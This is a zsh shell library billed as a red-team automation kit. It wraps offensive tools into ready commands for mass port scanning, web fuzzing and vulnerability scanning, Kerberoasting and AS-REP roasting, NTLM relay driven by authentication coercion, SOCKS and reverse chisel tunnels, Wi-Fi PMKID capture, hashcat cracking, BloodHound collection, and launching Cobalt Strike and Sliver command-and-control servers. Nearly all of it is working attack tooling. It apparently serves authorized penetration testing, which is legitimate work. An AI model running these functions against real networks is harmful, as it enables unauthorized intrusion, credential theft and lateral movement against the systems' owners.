# Zsh Ops Kit — Red Team Automation (Lyra build)
# drop-in library to source from ~/.zshrc
# Tested on macOS/Linux; requires coreutils, jq, curl, tmux, fzf (optional)

setopt errexit nounset pipefail pushd_silent
setopt no_flow_control no_nomatch completeinword
export LC_ALL=en_US.UTF-8
export EDITOR=${EDITOR:-vim}
export PAGER=${PAGER:-less}

: ${OP_ROOT:=$HOME/ops}
: ${OP_ID:=sandbox}
: ${OP_TZ:=UTC}
: ${OP_DNS:=1.1.1.1}
: ${HTTP_PROXY:=}
: ${HTTPS_PROXY:=}
: ${ALL_PROXY:=}
: ${TEAMSERVER:=}

umask 077

autoload -Uz colors && colors
ok()    { print -P "%F{green}[+]%f $*"; }
info()  { print -P "%F{blue}[*]%f  $*"; }
warn()  { print -P "%F{yellow}[!]%f $*"; }
err()   { print -P "%F{red}[-]%f  $*" >&2; }

# ensure_gum -- verify the Charmbracelet gum binary is available
ensure_gum() {
  command -v gum >/dev/null && return 0
  local os=${PLATFORM:-}
  if [[ -z $os ]]; then
    case "$(uname -s)" in
      Darwin) os=macos ;;
      Linux)
        if grep -qi microsoft /proc/version 2>/dev/null; then os=wsl; else os=linux; fi ;;
      MINGW*|MSYS*|CYGWIN*) os=windows ;;
      *) os=unknown ;;
    esac
  fi
  case $os in
    macos)
      command -v brew >/dev/null && brew install gum ;;
    linux|wsl)
      if command -v go >/dev/null; then
        go install github.com/charmbracelet/gum@latest
        export PATH="$HOME/go/bin:$PATH"
      fi ;;
    windows)
      command -v winget >/dev/null && winget install charmbracelet.gum -e --source winget ;;
    *)
      warn "Unsupported platform for automatic gum install" ;;
  esac
  command -v gum >/dev/null
}

op:new() {
  (( $# == 1 )) || { err "usage: op:new <codename>"; return 2; }
  local id ts root
  id=${1:gs/ /_}
  ts=$(date -u +%Y%m%dT%H%M%SZ)
  root="$OP_ROOT/${ts}_${id}"
  mkdir -p "$root"/{scans,loot,notes,pcaps,screens,wordlists,tunnels,reports,tmp}
  print "OP_ID=$id\nSTART=$ts\nTZ=$OP_TZ" > "$root/op.meta"
  : > "$root/notes/chronolog.md"
  export OP_ID="$id" OP_HOME="$root"
  ok "Workspace: $OP_HOME"
}

op:use() {
  (( $# )) || { err "usage: op:use <path|pattern>"; return 2; }
  local sel
  if [[ -d $1 ]]; then sel=$1
  else sel=$(ls -1dt $OP_ROOT/*$1* 2>/dev/null | head -n1); fi
  [[ -n $sel ]] || { err "no match"; return 1; }
  export OP_HOME="$sel" OP_ID=$(basename "$sel" | cut -d_ -f2-)
  ok "Using $OP_HOME"
}

op:log() { (( $# )) || return 0; print -r -- "$(date -u +%FT%TZ) $*" >> "$OP_HOME/notes/chronolog.md"; }

op:tmux() {
  command -v tmux >/dev/null || { err "tmux required"; return 1; }
  local s="op_${OP_ID:-$(date +%H%M%S)}"
  tmux has-session -t "$s" 2>/dev/null && { tmux attach -t "$s"; return; }
  tmux new-session -d -s "$s" -n main -c "$OP_HOME"
  tmux send-keys -t "$s":main "cd '$OP_HOME'" C-m
  tmux split-window -h -t "$s":main -c "$OP_HOME/scans"
  tmux split-window -v -t "$s":main.1 -c "$OP_HOME/loot"
  tmux split-window -v -t "$s":main.0 -c "$OP_HOME/tunnels"
  tmux select-pane -t "$s":main.0
  tmux rename-window -t "$s":main "ops"
  tmux new-window -t "$s" -n web -c "$OP_HOME/scans"
  tmux new-window -t "$s" -n crack -c "$OP_HOME/loot"
  tmux attach -t "$s"
}

targets:add() {
  mkdir -p "$OP_HOME/targets"
  local raw="$OP_HOME/targets/raw.txt"
  (( $# )) && print -l -- "$@" >> "$raw"
  if ! tty -s; then cat >> "$raw"; fi
  sort -u "$raw" | awk '{gsub(/\r/,"",$0); print}' > "$OP_HOME/targets/all.txt"
  grep -Eo '([0-9]{1,3}\.){3}[0-9]{1,3}(/[0-9]{1,2})?' "$OP_HOME/targets/all.txt" | sort -u > "$OP_HOME/targets/ips.txt" || true
  grep -Eo '([A-Za-z0-9_-]+\.)+[A-Za-z]{2,}' "$OP_HOME/targets/all.txt" | sort -u > "$OP_HOME/targets/hosts.txt" || true
  ok "Targets: $(wc -l < "$OP_HOME/targets/all.txt") (IPs $(wc -l < "$OP_HOME/targets/ips.txt"), hosts $(wc -l < "$OP_HOME/targets/hosts.txt"))"
}

targets:alive() {
  local in="$OP_HOME/targets/ips.txt" out="$OP_HOME/scans/alive_ips.txt"
  [[ -s $in ]] || { err "no IPs"; return 1; }
  if command -v fping >/dev/null; then
    fping -a -q -f "$in" 2>/dev/null | sort -V | tee "$out"
  else
    command -v masscan >/dev/null || { err "need fping or masscan"; return 1; }
    masscan -iL "$in" -p80,443 --rate 20000 2>/dev/null | awk '/Discovered open/{print $6}' | sort -V | tee "$out"
  fi
  ok "Alive: $(wc -l < "$out")"
}

recon:tcp() {
  local ips="$OP_HOME/scans/alive_ips.txt"
  [[ -s $ips ]] || { err "run targets:alive first"; return 1; }
  command -v masscan >/dev/null || { err "masscan required"; return 1; }
  local msout="$OP_HOME/scans/masscan.grep"
  masscan -iL "$ips" -p1-65535 --rate 30000 --wait 0 --open | tee "$msout"
  awk '/Discovered open/{print $6":"$4}' "$msout" | sed 's/\/tcp//' | sort -u > "$OP_HOME/scans/open_endpoints.txt"
  local nmapout="$OP_HOME/scans/nmap_all.xml"
  command -v nmap >/dev/null && nmap -sV -sC -Pn -oX "$nmapout" -iL "$ips" --open
  ok "nmap saved: $nmapout"
}

recon:web() {
  local hosts="$OP_HOME/targets/hosts.txt"
  local ips="$OP_HOME/scans/alive_ips.txt"
  [[ -s $hosts || -s $ips ]] || { err "no hosts or ips"; return 1; }
  local scope="$OP_HOME/scans/http_targets.txt"
  : > "$scope"
  [[ -s $hosts ]] && cat "$hosts" >> "$scope"
  [[ -s $ips ]] && awk '{print "http://"$1"\nhttps://"$1}' "$ips" >> "$scope"
  sort -u "$scope" -o "$scope"
  command -v httpx >/dev/null || { err "httpx required"; return 1; }
  local live="$OP_HOME/scans/httpx_live.txt"
  httpx -l "$scope" -title -tech-detect -status-code -ip -cdn -json -o "$OP_HOME/scans/httpx.json" | tee "$live"
  if command -v nuclei >/dev/null; then
    nuclei -l "$live" -severity critical,high,medium -stats -json -o "$OP_HOME/scans/nuclei.json"
  fi
  ok "web recon complete"
}

ffuf:auto() {
  command -v ffuf >/dev/null || { err "ffuf required"; return 1; }
  local live="$OP_HOME/scans/httpx_live.txt"
  [[ -s $live ]] || { err "no httpx_live.txt"; return 1; }
  local wordlist=${1:-/usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt}
  while read -r url _; do
    local outdir="$OP_HOME/scans/ffuf/$(echo "$url" | sed 's#https\?://##; s/[:/]/_/g')"
    mkdir -p "$outdir"
    ffuf -u "$url/FUZZ" -w "$wordlist" -ac -mc all -fc 404,400 -of json -o "$outdir/ffuf.json"
  done < <(awk '{print $1}' "$live")
}

ad:spn() {  # ad:spn <domain>/<user>:<pass> [dc]
  (( $# >= 1 )) || { err "usage: ad:spn <creds> [dc]"; return 2; }
  local dc=${2:-}
  python3 - <<'PY' "$1" "$dc"
import sys, subprocess
creds=sys.argv[1]; dc=sys.argv[2]
cmd=["GetUserSPNs.py", creds, "-request"]
if dc: cmd += ["-dc-ip", dc]
subprocess.run(cmd)
PY
}

ad:coerce() {
  (( $# >= 1 )) || { err "usage: ad:coerce <listener_ip> [targets]"; return 2; }
  command -v tmux >/dev/null || { err "tmux required"; return 1; }
  local lip=$1; local tgt=${2:-@"$OP_HOME/scans/alive_ips.txt"}
  info "Starting ntlmrelayx & Coercer"
  tmux new-window -n relay -c "$OP_HOME" "ntlmrelayx.py -smb2support -tf $OP_HOME/scans/alive_ips.txt -socks -smb2support -ip $lip | tee $OP_HOME/scans/relay.log"
  tmux new-window -n coerce -c "$OP_HOME" "coercer -l $lip -t $(cat $OP_HOME/scans/alive_ips.txt | tr '\n' ',' | sed 's/,$//') | tee $OP_HOME/scans/coerce.log"
}

tunnel:socks() {
  local lp=${1:-1080}; shift || true
  local jump=${1:-}
  if [[ -n $jump ]]; then
    ssh -N -D "$lp" -o ServerAliveInterval=30 -o ExitOnForwardFailure=yes "$jump" & echo $! > "$OP_HOME/tunnels/socks.pid"
  else
    err "provide jump user@host or use chisel"
    return 2
  fi
  export ALL_PROXY="socks5://127.0.0.1:$lp"
  ok "SOCKS on 127.0.0.1:$lp"
}

tunnel:socks_off() {
  [[ -f $OP_HOME/tunnels/socks.pid ]] && kill "$(< $OP_HOME/tunnels/socks.pid)" 2>/dev/null || true
  unset ALL_PROXY HTTP_PROXY HTTPS_PROXY
  ok "SOCKS disabled"
}

tunnel:chisel_rev() {
  local lp=${1:-8000}
  tmux new-window -n chisel -c "$OP_HOME/tunnels" "chisel server -p $lp --reverse | tee chisel_server.log"
  ok "Run on target: chisel client <our_ip>:$lp R:socks"
}

pc:on()  { export PROXYCHAINS_CONF=${PROXYCHAINS_CONF:-/etc/proxychains4.conf}; ok "proxychains ON ($PROXYCHAINS_CONF)"; }
pc:off() { unset PROXYCHAINS_CONF; ok "proxychains OFF"; }

pcap:start() {
  local ifc=${1:-$(command -v ip >/dev/null && ip -o -4 route show to default 2>/dev/null | awk '{print $5; exit}')}
  local filt=${2:-""}
  local dir="$OP_HOME/pcaps"; mkdir -p "$dir"
  local ts=$(date -u +%Y%m%dT%H%M%SZ)
  local out="$dir/$ts-${ifc}.pcapng"
  if command -v dumpcap >/dev/null; then
    nohup dumpcap -i "$ifc" -w "$out" -b filesize:200000 -b files:20 ${filt:+-f "$filt"} >/dev/null 2>&1 & echo $! > "$dir/dumpcap.pid"
  else
    nohup tcpdump -i "$ifc" -w "$out" ${filt:+$filt} >/dev/null 2>&1 & echo $! > "$dir/tcpdump.pid"
  fi
  ok "pcap: $out"
}

pcap:stop() {
  for p in "$OP_HOME/pcaps"/*.pid; do [[ -f $p ]] && kill "$(< $p)" 2>/dev/null && rm -f "$p"; done
  ok "pcap stopped"
}

loot:add() {
  (( $# >= 1 )) || { err "usage: loot:add <path> [label]"; return 2; }
  local src=$1; shift || true
  local label=${1:-generic}
  local dest="$OP_HOME/loot/$label"
  mkdir -p "$dest"
  local base=$(basename "$src")
  cp -a "$src" "$dest/" || { err "copy failed"; return 1; }
  local sha=$(sha256sum "$dest/$base" | awk '{print $1}')
  print -r -- "$(date -u +%FT%TZ) $label $base sha256=$sha" >> "$OP_HOME/loot/index.tsv"
  ok "loot: $label/$base"
}

loot:webshot() {
  (( $# == 1 )) || { err "usage: loot:webshot <url>"; return 2; }
  local out="$OP_HOME/screens/$(date -u +%Y%m%dT%H%M%SZ)_$(echo "$1" | sed 's#https\?://##; s/[:/]/_/#g').png"
  mkdir -p "$OP_HOME/screens"
  if command -v chromium >/dev/null; then
    chromium --headless --disable-gpu --screenshot="$out" --window-size=1400,1000 "$1"
  elif command -v google-chrome >/dev/null; then
    google-chrome --headless --disable-gpu --screenshot="$out" --window-size=1400,1000 "$1"
  else
    err "chromium or google-chrome required"
    return 1
  fi
  ok "screenshot: $out"
}

hash:crack() {
  (( $# >= 2 )) || { err "usage: hash:crack <hashfile> <mode> [wordlist] [rules]"; return 2; }
  local hf=$1 mode=$2 wl=${3:-/usr/share/wordlists/rockyou.txt} rules=${4:-best64.rule}
  local out="$OP_HOME/loot/cracked-$(basename "$hf").pot"
  hashcat -m "$mode" -a 0 "$hf" "$wl" -r "$rules" --potfile-path "$out" --status --status-timer=30 --hwmon-temp-abort=92
}

pot:grep() {
  (( $# )) || { err "usage: pot:grep <pattern>"; return 2; }
  grep -iR --color=auto "$*" "$OP_HOME/loot"/*.pot 2>/dev/null || true
}

enc:b64()  { print -nr -- "$*" | base64; }
enc:db64() { print -nr -- "$*" | base64 -d; }
enc:hex()  { print -nr -- "$*" | xxd -p -c9999; }
enc:dhex() { print -nr -- "$*" | xxd -r -p; }
enc:url()  { python3 -c 'import sys,urllib.parse;print(urllib.parse.quote(sys.argv[1]))' "$*"; }
enc:durl() { python3 -c 'import sys,urllib.parse;print(urllib.parse.unquote(sys.argv[1]))' "$*"; }

function _zle_b64enc() { BUFFER=$(print -nr -- "$BUFFER" | base64); CURSOR=${#BUFFER}; zle -R; }
zle -N _zle_b64enc
bindkey '^Xb' _zle_b64enc

http:raw() { local method=$1 url=$2; shift 2; curl -i -sS -X "$method" "$url" "$@"; }

ua:list() { cat <<'LIST'
Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124 Safari/537.36
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124 Safari/537.36
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15
LIST
}

ua:curl() { local ua=$(ua:list | shuf -n1); curl -A "$ua" "$@"; }

wifi:pmkid() {
  (( $# == 2 )) || { err "usage: wifi:pmkid <iface> <out.hc22000>"; return 2; }
  command -v hcxdumptool >/dev/null && command -v hcxpcapngtool >/dev/null || { err "hcxdumptool/hcxpcapngtool required"; return 1; }
  local ifc=$1 out=$2
  hcxdumptool -i "$ifc" --enable_status=15 -o "$OP_HOME/tmp/pmkid.pcapng"
  hcxpcapngtool -o "$OP_HOME/tmp/pmkid.22000" "$OP_HOME/tmp/pmkid.pcapng"
  mv "$OP_HOME/tmp/pmkid.22000" "$out"
  ok "pmkid saved: $out"
}

_git_branch() { git rev-parse --abbrev-ref HEAD 2>/dev/null; }
_vpn_state()  { command -v ip >/dev/null && ip -br link 2>/dev/null | grep -E 'wg|tun|tap' -c 2>/dev/null || echo 0; }
_socks_state(){ [[ -n $ALL_PROXY ]] && print on || print off; }

set_prompt() {
  local b=$(_git_branch); local vpn=$(_vpn_state); local socks=$(_socks_state)
  PROMPT='%F{cyan}${OP_ID:-no-op}%f %F{magenta}%~%f'
  [[ -n $b ]] && PROMPT+=" %F{yellow}(${b})%f"
  PROMPT+=" %F{blue}vpn:${vpn}%f %F{blue}socks:${socks}%f\n%F{green}$ %f"
}
precmd_functions+=(set_prompt)

alias ll='ls -lah --group-directories-first'
alias grep='grep --color=auto'
alias p='ps auxwf'
alias myip='curl -s ifconfig.me; echo'
alias jc='jq -C . | less -R'

alias nmap:safe='nmap -sV -sC -T3 -Pn'
alias nmap:udp='nmap -sU --top-ports 200'

alias gco='git checkout'
alias gst='git status -sb'

autoload -Uz compinit && compinit
_targets_completion() {
  _arguments '*:targets:->targets'
  case $state in
    (targets)
      compadd $(cat "$OP_HOME/targets/all.txt" 2>/dev/null)
    ;;
  esac
}
compdef _targets_completion targets:add

# ------------------------------
# Additional automation helpers
# ------------------------------

# Autodiscovery daemon
auto:daemon_start() {
  command -v ip >/dev/null || { err "ip required"; return 1; }
  local log="$OP_HOME/notes/autodiscovery.log"
  ( ip monitor address | while read -r line; do
      print -r -- "$(date -u +%FT%TZ) $line" >> "$log"
      if [[ $line == *"inet"* ]]; then
        local ip=${line#*inet }
        ip=${ip%%/*}
        targets:add "$ip" >/dev/null
        if command -v nmap >/dev/null; then
          nmap -sS --top-ports 100 "$ip" -oN "$OP_HOME/scans/auto_$ip.nmap" >/dev/null
        fi
      fi
    done ) &
  echo $! > "$OP_HOME/autodiscover.pid"
  ok "autodiscovery started"
}

auto:daemon_stop() {
  [[ -f $OP_HOME/autodiscover.pid ]] && kill "$(< $OP_HOME/autodiscover.pid)" 2>/dev/null && rm -f "$OP_HOME/autodiscover.pid"
  ok "autodiscovery stopped"
}

# C2 helpers
c2:cs_start() {
  (( $# >= 2 )) || { err "usage: c2:cs_start <dir> <pass> [host]"; return 2; }
  local dir=$1 pass=$2 host=${3:-0.0.0.0}
  (cd "$dir" && ./teamserver "$host" "$pass" &) && ok "cobalt strike teamserver starting"
}

c2:sliver_start() {
  command -v sliver-server >/dev/null || { err "sliver-server not found"; return 1; }
  sliver-server &
  ok "sliver server started"
}

c2:hash_logs() {
  local log=${1:-$OP_HOME/teamserver/teamserver.log}
  [[ -f $log ]] || { err "log not found"; return 1; }
  local sha=$(sha256sum "$log" | awk '{print $1}')
  print -r -- "$(date -u +%FT%TZ) teamserver_log_sha256=$sha" >> "$OP_HOME/loot/index.tsv"
  ok "log hashed"
}

c2:ioc_export() {
  local out=${1:-$OP_HOME/reports/iocs_$(date -u +%Y%m%dT%H%M%SZ).tar.gz}
  tar czf "$out" $OP_HOME/teamserver/*.log $OP_HOME/scans/nmap_all.xml 2>/dev/null || true
  ok "IOCs exported: $out"
}

# Wordlist generation
wordlist:brain() {
  command -v princeprocessor >/dev/null || { err "princeprocessor required"; return 1; }
  local seeds=${1:-$OP_HOME/wordlists/seeds.txt}
  local out="$OP_HOME/wordlists/prince.txt"
  princeprocessor "$seeds" > "$out"
  [[ -f $OP_HOME/notes/org_names.txt ]] && tr -cs 'A-Za-z0-9' '\n' < "$OP_HOME/notes/org_names.txt" | tr 'A-Z' 'a-z' >> "$out"
  sort -u "$out" -o "$out"
  ok "wordlist generated: $out"
}

# Credential router
cred:add() {
  (( $# >= 2 )) || { err "usage: cred:add <name> <credential>"; return 2; }
  mkdir -p "$OP_HOME/creds"
  local enc="$OP_HOME/creds/$1.age"; shift
  if command -v age >/dev/null; then
    print -nr -- "$*" | age -p > "$enc"
  elif command -v sops >/dev/null; then
    print -nr -- "$*" | sops -e /dev/stdin > "$enc"
  else
    err "age or sops required"; return 1
  fi
  ok "credential stored: $enc"
}

cred:get() {
  (( $# == 1 )) || { err "usage: cred:get <name>"; return 2; }
  local enc="$OP_HOME/creds/$1.age"
  [[ -f $enc ]] || { err "credential not found"; return 1; }
  if command -v age >/dev/null; then
    age -d "$enc"
  elif command -v sops >/dev/null; then
    sops -d "$enc"
  else
    err "age or sops required"; return 1
  fi
}

# Reporting
report:summary() {
  local out=${1:-$OP_HOME/reports/summary_$(date -u +%Y%m%dT%H%M%SZ).md}
  {
    echo "# Report Summary";
    [[ -s $OP_HOME/scans/nmap_all.xml ]] && echo "- nmap: $(basename $OP_HOME/scans/nmap_all.xml)";
    [[ -s $OP_HOME/scans/httpx.json ]] && echo "- httpx: $(basename $OP_HOME/scans/httpx.json)";
    [[ -s $OP_HOME/scans/nuclei.json ]] && echo "- nuclei: $(basename $OP_HOME/scans/nuclei.json)";
    ls $OP_HOME/scans/ffuf/*/ffuf.json 2>/dev/null | while read -r f; do echo "- ffuf: $(basename $(dirname $f))"; done
    ls $OP_HOME/loot/*.pot 2>/dev/null | while read -r p; do echo "- cracked: $(basename $p)"; done
  } > "$out"
  ok "report written: $out"
}

# OpSec modes
opsec:quiet() {
  export OPSEC_MODE=quiet
  export OP_RATE_LIMIT=1
  ok "OpSec quiet mode enabled"
}

opsec:loud() {
  export OPSEC_MODE=loud
  unset OP_RATE_LIMIT
  ok "OpSec loud mode enabled"
}

# Traffic shaping
traffic:limit() {
  (( $# >= 1 )) || { err "usage: traffic:limit <iface> [rate] [latency]"; return 2; }
  command -v tc >/dev/null || { err "tc required"; return 1; }
  local dev=$1 rate=${2:-1mbit} delay=${3:-100ms}
  sudo tc qdisc add dev "$dev" root handle 1: tbf rate "$rate" burst 32k latency "$delay"
  ok "traffic limited on $dev"
}

traffic:clear() {
  (( $# == 1 )) || { err "usage: traffic:clear <iface>"; return 2; }
  command -v tc >/dev/null || { err "tc required"; return 1; }
  sudo tc qdisc del dev "$1" root 2>/dev/null || true
  ok "traffic shaping cleared on $1"
}

# Canary tooling
canary:mint() {
  (( $# == 1 )) || { err "usage: canary:mint <type>"; return 2; }
  curl -fsSL "https://canarytokens.org/generate?type=$1&format=simple" || err "token generation failed"
}

canary:check() {
  (( $# == 1 )) || { err "usage: canary:check <url>"; return 2; }
  curl -fsSL "$1" | head
}

# Cloud enumeration
cloud:aws_quick() {
  command -v aws >/dev/null || { err "awscli required"; return 1; }
  aws sts get-caller-identity
  aws iam list-users --output table | head
}

cloud:azure_quick() {
  command -v az >/dev/null || { err "az cli required"; return 1; }
  az account show
}

cloud:gcp_quick() {
  command -v gcloud >/dev/null || { err "gcloud required"; return 1; }
  gcloud auth list
}

# Active Directory helpers
ad:roast() {
  (( $# >= 1 )) || { err "usage: ad:roast <domain/user:pass> [dc]"; return 2; }
  local dc=${2:-}
  if command -v GetUserSPNs.py >/dev/null; then
    GetUserSPNs.py "$1" ${dc:+-dc-ip $dc} -request -output spns.hashes
    if command -v GetNPUsers.py >/dev/null; then
      GetNPUsers.py "$1" ${dc:+-dc-ip $dc} -usersfile users.txt -output asrep.hashes
    fi
    ok "roast complete"
  else
    err "impacket required"
  fi
}

ad:service_hunter() {
  command -v bloodhound-python >/dev/null || { err "bloodhound-python required"; return 1; }
  bloodhound-python -c All -o "$OP_HOME/bloodhound"
  ok "BloodHound data collected"
}
